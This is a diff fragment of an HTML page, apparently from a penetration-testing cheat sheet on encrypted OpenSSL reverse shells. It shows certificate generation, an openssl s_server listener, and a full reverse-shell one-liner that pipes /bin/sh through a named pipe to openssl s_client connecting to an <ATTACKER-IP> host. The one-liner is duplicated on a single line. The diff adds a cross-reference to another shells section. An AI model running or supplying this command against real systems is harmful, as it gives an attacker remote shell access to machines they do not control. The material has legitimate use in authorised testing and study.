@@ -10,4 +10,6 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;<br/>
 <br/>
 # Reverse Shell:<br/>
-mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</body></html>
+mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
+<br/>
+See Reverse Shells / Shells &gt; Openssl</body></html>
